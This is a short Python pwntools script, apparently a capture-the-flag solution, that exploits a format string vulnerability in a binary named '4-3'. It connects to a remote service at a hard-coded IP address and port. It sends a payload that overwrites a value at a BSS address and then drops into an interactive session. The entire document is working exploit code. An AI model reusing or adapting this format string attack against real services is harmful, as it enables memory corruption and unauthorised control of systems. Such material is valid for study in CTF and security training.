from pwn import *

p=process('./4-3')
p=remote('121.42.189.18',10008)
bss=0x804a038
payload=fmtstr_payload(7,{bss:0xda})
print p.recv();
raw_input()
p.sendline(payload)
print p.recv()
p.interactive();

